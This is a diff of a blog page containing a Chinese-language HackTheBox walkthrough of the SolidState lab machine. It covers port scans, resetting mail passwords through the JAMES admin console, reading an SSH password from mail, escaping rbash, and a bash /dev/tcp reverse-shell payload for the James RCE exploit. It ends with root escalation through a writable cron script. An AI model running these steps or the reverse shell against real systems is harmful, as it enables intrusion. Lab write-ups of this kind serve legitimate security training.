@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;85  10.10.10.51                                                                                                              端口扫描需要全端口, 有个非常见端口4555">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;85  10.10.10.51   端口扫描需要全端口, 有个非常见端口4555： 1234567891011121314151617181920212223242526272829303132333435➜  ~ sudo masscan -p0-65535 --max-rate 1000">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SolidState - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/26/SolidState-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;85  10.10.10.51                                                                                                              端口扫描需要全端口, 有个非常见端口4555">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;85  10.10.10.51   端口扫描需要全端口, 有个非常见端口4555： 1234567891011121314151617181920212223242526272829303132333435➜  ~ sudo masscan -p0-65535 --max-rate 1000">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031601.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031602.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031603.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -211,14 +218,7 @@
 </li>
 <li><h2 id="10-10-10-51"><a href="#10-10-10-51" class="headerlink" title="10.10.10.51"></a>10.10.10.51</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031601.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口, 有个非常见端口4555：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo masscan -p0-65535 --max-rate 1000 10.10.10.51</span><br><span class="line">[sudo] password for miao:</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-03-14 20:35:04 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 25/tcp on 10.10.10.51</span><br><span class="line">Discovered open port 110/tcp on 10.10.10.51</span><br><span class="line">Discovered open port 4555/tcp on 10.10.10.51</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.51</span><br><span class="line">Discovered open port 22/tcp on 10.10.10.51</span><br><span class="line">Discovered open port 119/tcp on 10.10.10.51</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -p22,25,80,110,119,4555 10.10.10.51</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 13:22 CST</span><br><span class="line">Nmap scan report for 10.10.10.51</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)</span><br><span class="line">|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)</span><br><span class="line">|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)</span><br><span class="line">25/tcp   open  smtp        JAMES smtpd 2.3.2</span><br><span class="line">|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.4 [10.10.14.4]),</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Home - Solid State Security</span><br><span class="line">110/tcp  open  pop3        JAMES pop3d 2.3.2</span><br><span class="line">119/tcp  open  nntp        JAMES nntpd (posting ok)</span><br><span class="line">4555/tcp open  james-admin JAMES Remote Admin 2.3.2</span><br><span class="line">Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds</span><br></pre></td></tr></table></figure>
 
@@ -226,95 +226,32 @@
 <ul>
 <li>Apache James Server 2.3.2 - Remote Command Execution - Linux remote Exploit<br><a href="https://www.exploit-db.com/exploits/35513" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35513</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031602.jpg" alt=""></p>
 <p>相关漏洞是需要其他用户登录触发的，所以先关注pop3部分</p>
 <h2 id="pop3"><a href="#pop3" class="headerlink" title="pop3"></a>pop3</h2><p>大概就是通过james去修改用户密码，登录pop3，查看邮件：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setpassword james abcd</span><br><span class="line">setpassword thomas abcd</span><br><span class="line">setpassword john abcd</span><br><span class="line">setpassword mindy abcd</span><br><span class="line">setpassword mailadmin abcd</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">for user in james john  thomas mindy mailadmin; do ( echo USER $&#123;user&#125;; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC 10.10.10.51 110;  done</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031603.jpg" alt=""></p>
 <h2 id="mindy"><a href="#mindy" class="headerlink" title="mindy"></a>mindy</h2><p>查看mindy用户邮件，他是新员工，邮件里有ssh密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">$ ncat -nvC 10.10.10.51 110</span><br><span class="line">Ncat: Version 7.91 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Connected to 10.10.10.51:110.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready</span><br><span class="line">USER mindy</span><br><span class="line">+OK</span><br><span class="line">PASS abcd</span><br><span class="line">+OK Welcome mindy</span><br><span class="line">LIST</span><br><span class="line">+OK 2 1945</span><br><span class="line">1 1109</span><br><span class="line">2 836</span><br><span class="line">.</span><br><span class="line">REPR 1</span><br><span class="line">-ERR</span><br><span class="line">RETR 1</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798</span><br><span class="line">          for &lt;mindy@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Welcome</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line">Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.</span><br><span class="line"></span><br><span class="line">We are looking forward to you joining our team and your success at Solid State Security.</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line">.</span><br><span class="line">RETR 2</span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: &lt;mailadmin@localhost&gt;</span><br><span class="line">Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581</span><br><span class="line">          for &lt;mindy@localhost&gt;;</span><br><span class="line">          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Your Access</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here are your ssh credentials to access the system. Remember to reset your password after your first login.</span><br><span class="line">Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.</span><br><span class="line"></span><br><span class="line">username: mindy</span><br><span class="line">pass: P@55W0rd1!2@</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>mindy用户直接ssh登录，得到user flag，并且注意到当前是rbash，不是常见的bash：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031604.jpg" alt=""></p>
 <h2 id="James-to-bash"><a href="#James-to-bash" class="headerlink" title="James to bash"></a>James to bash</h2><p>这时候就可以结合前面的james漏洞了,修改payload执行，然后ssh登录触发：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.4&#x2F;4444 0&gt;&amp;1&#39;</span><br><span class="line"></span><br><span class="line">python james_exp.py 10.10.10.51</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031605.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031606.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031607.jpg" alt=""></p>
 <h2 id="easy-to-bash"><a href="#easy-to-bash" class="headerlink" title="easy to bash"></a>easy to bash</h2><p>也有简单的方法，登录时候指定bash：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mindy@10.10.10.51 -t bash</span><br></pre></td></tr></table></figure>
 
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>简单收集下就能发现opt目录下tmp.py文件root会定期执行，用于清理tmp目录，而这个文件是我们可写的：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031608.jpg" alt=""></p>
 <p>那就可以直接修改代码等待执行</p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>有nc，直接加一个反弹shell的，然后等待执行:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031609.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031609.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021031610.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Apache James Server 2.3.2 - Remote Command Execution - Linux remote Exploit<br><a href="https://www.exploit-db.com/exploits/35513" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35513</a></li>
 <li>HTB: SolidState | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html</a></li>
@@ -329,7 +266,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-03-16T06:40:38.087Z" itemprop="dateUpdated">2021-03-16 14:40:38</time>
+    Last updated: <time datetime="2021-03-16T06:40:38.087Z" itemprop="dateUpdated">2021-03-16 14:40:38</time>
 </span><br>
 
 
@@ -496,11 +433,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
